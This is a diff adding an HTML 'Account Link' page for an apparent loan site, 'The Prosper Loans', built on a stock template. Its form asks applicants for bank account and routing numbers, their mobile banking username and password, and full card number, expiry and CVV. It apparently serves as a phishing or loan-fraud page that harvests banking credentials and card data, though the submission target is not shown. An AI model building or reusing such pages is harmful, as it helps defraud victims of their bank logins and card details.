@@ -1,0 +1,253 @@
+
+@@include("partials/main.html")
+
+    <head>
+        @@include("partials/title-meta.html", {"title": "Landrick"})
+        
+        <!-- Css -->
+        @@include("partials/head-css.html")
+
+        <style>
+            input[type=number]::-webkit-outer-spin-button,
+            input[type=number]::-webkit-inner-spin-button {
+                -webkit-appearance: none;
+                margin: 0;
+            }
+
+            input[type=number] {
+                -moz-appearance: textfield;
+            }
+        </style>
+    </head>
+
+    @@include("partials/body.html")
+        
+        
+        
+        @@include("partials/navbar/nav-bg-white.html")
+        
+        <!-- Hero Start -->
+        <section class="bg-half-170 bg-primary d-table w-100" style="background-image: url('assets/images/job/bg.png');">
+            <div class="container">
+                <div class="row mt-5 justify-content-center">
+                    <div class="col-lg-12 text-center">
+                        <div class="pages-heading">
+                            <h2 class="title text-white title-dark mb-0"> Account Link </h4>
+                        </div>
+                    </div>  
+                </div><!--end row-->
+                
+                <div class="position-breadcrumb">
+                    <nav aria-label="breadcrumb" class="d-inline-block">
+                        <ul class="breadcrumb rounded shadow mb-0 px-4 py-2">
+                            <li class="breadcrumb-item"><a href="index.html">The Prosper Loans</a></li>
+                            <li class="breadcrumb-item"><a href="account-link.html">Account Link</a></li>
+                            <!-- <li class="breadcrumb-item active" aria-current="page">Job Apply</li> -->
+                        </ul>
+                    </nav>
+                </div>
+            </div> <!--end container-->
+        </section><!--end section-->
+        <!-- Hero End -->
+
+        <!-- Shape Start -->
+        <div class="position-relative">
+            <div class="shape overflow-hidden text-color-white">
+                <svg viewBox="0 0 2880 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M0 48H1437.5H2880V0H2160C1442.5 52 720 0 720 0H0V48Z" fill="currentColor"></path>
+                </svg>
+            </div>
+        </div>
+        <!--Shape End-->
+        
+        <!-- Job apply form Start -->
+        <section class="section">
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-12 text-center">
+                        <div class="section-title mb-4 pb-2">
+                            <h4 class="title mb-4">Account Link</h4>
+                            <p class="text-muted para-desc mb-0 mx-auto">Link your account effortlessly for seamless financial management. Connect today and experience a streamlined approach to your financial world!</p>
+                        </div>
+                    </div><!--end col-->
+                </div><!--end row-->
+                <div class="row justify-content-center">
+                    <div class="col-lg-10 col-md-7">
+                        <div class="card custom-form border-0">
+                            <div class="card-body">
+                                <form class="rounded shadow p-4">
+                                    <div class="row">
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Account Holder Name : <span class="text-danger">*</span></label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="name" id="name" type="text" class="form-control" placeholder="Account Holder Name : ">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Bank Name : <span class="text-danger">*</span></label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="bank_name" id="bank_name" type="text" class="form-control" placeholder="Bank Name : ">
+                                                </div>
+                                            </div> 
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Account Type : </label>
+                                                <select class="form-control form-select" id="account_type">
+                                                    <option value="" disabled selected>Select Account Type :  </option>
+                                                    <option>Saving Account</option>
+                                                    <option>Current Account</option>
+                                                    <option>Three</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Account Number : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="account_number" id="account_number" type="number" class="form-control disable-arrows" placeholder="Account Number : ">
+                                                </div>
+                                            </div>                                                                               
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Rounting Number : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="rounting_number" id="rounting_number" type="number" class="form-control disable-arrows" placeholder="Rounting Number : ">
+                                                </div>
+                                            </div>                                                                               
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Username Of Mobile Banking : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="user_name" id="user_name" type="text" class="form-control" placeholder="Username Of Mobile Banking : ">
+                                                </div>
+                                            </div>                                                                               
+                                        </div>
+                                        <!-- <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Password Of Mobile Banking : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="password" id="password" type="password" class="form-control" placeholder="Password : ">
+                                                </div>
+                                            </div>                                                                               
+                                        </div> -->
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Password Of Mobile Banking : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="password" id="password" type="password" class="form-control" placeholder="Password : ">
+                                                    <!-- <i class="icon-sm fe fe-eye position-absolute" id="togglePassword" style="top: 50%; right: 15px; transform: translateY(-50%); cursor: pointer;"></i> -->
+                                                    <i data-feather="eye" class="fea icon-sm icons" id="togglePassword" style="top: 50%; left: 370px; transform: translateX(50%); transform: translateY(-50%); cursor: pointer;"></i>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Debit/Credit Card Number : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="subject" id="subject2" type="number" class="form-control disable-arrows" placeholder="Debit/Credit Card Number : ">
+                                                </div>
+                                            </div>                                                                               
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">Expiration : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="subject" id="subject2" type="number" class="form-control disable-arrows" placeholder="Expiration : ">
+                                                </div>
+                                            </div>                                                                               
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="mb-3">
+                                                <label class="form-label">CVV : </label>
+                                                <div class="form-icon position-relative">
+                                                    <input required name="subject" id="subject2" type="number" class="form-control disable-arrows" placeholder="CVV : ">
+                                                </div>
+                                            </div>                                                                               
+                                        </div>
+                                        <!-- <div class="col-md-12">
+                                            <div class="mb-3">
+                                                <label class="form-label">Username Of Mobile Banking : </label>
+                                                <div class="form-icon position-relative">
+                                                    <textarea name="comments" id="comments2" rows="4" class="form-control" placeholder="Describe the job : "></textarea>
+                                                </div>
+                                            </div>
+                                        </div>                                   -->
+                                        <!-- <div class="col-md-12">
+                                            <div class="mb-3">
+                                                <label for="formFile" class="form-label">Upload Your Cv / Resume : </label>
+                                                <input class="form-control" type="file" id="formFile">
+                                            </div>                                                                               
+                                        </div> -->
+                                        <div class="col-md-12">
+                                            <div class="mb-3">
+                                                <div class="form-check">
+                                                    <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault">
+                                                    <label class="form-check-label" for="flexCheckDefault">I Accept <a href="#" class="text-primary">Terms And Condition</a></label>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div><!--end row-->
+                                    <div class="row">
+                                        <div class="col-sm-12">
+                                            <input type="submit" id="submit2" name="send" class="submitBnt btn btn-primary" value="Apply Now">
+                                        </div>
+                                    </div><!--end row-->
+                                </form><!--end form-->
+                            </div> 
+                        </div><!--end custom-form-->
+                    </div>  
+                </div>
+            </div><!--end container-->
+        </section><!--end section-->
+        <!-- Job apply form End -->
+
+        
+        @@include("partials/footer/footer-one.html")
+
+        <!-- @@include("partials/switcherbar.html") -->
+
+        <!-- Back to top -->
+        <!-- Back to top -->
+
+        <!-- Javascript -->
+        @@include("partials/vendor-scripts.html")
+        <!-- Main Js -->
+        <script src="assets/libs/feather-icons/feather.min.js"></script>
+        <script src="assets/js/plugins.init.js"></script><!--Note: All init js like tiny slider, counter, countdown, maintenance, lightbox, gallery, swiper slider, aos animation etc.-->
+        <script src="assets/js/app.js"></script><!--Note: All important javascript like page loader, menu, sticky menu, menu-toggler, one page menu etc. -->
+        <script>
+            const togglePassword = document.querySelector('#togglePassword');
+            const password = document.querySelector('#password');
+            let hidePasswordTimeout;
+
+            togglePassword.addEventListener('click', function () {
+                // Toggle the type attribute
+                const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+                password.setAttribute('type', type);
+            
+                // Toggle the icon
+                this.classList.toggle('fe-eye');
+                this.classList.toggle('fe-eye-off');
+            
+                // Clear any previous timeout to avoid overlapping timers
+                clearTimeout(hidePasswordTimeout);
+            
+                // If password is set to 'text', start the timer to hide it after 10 seconds
+                if (type === 'text') {
+                    hidePasswordTimeout = setTimeout(() => {
+                        password.setAttribute('type', 'password');
+                        // Ensure the icon also resets to 'eye' after hiding the password
+                        togglePassword.classList.remove('fe-eye-off');
+                        togglePassword.classList.add('fe-eye');
+                    }, 10000); // 10 seconds
+                }
+            });
+        </script>
+    </body>
+</html>
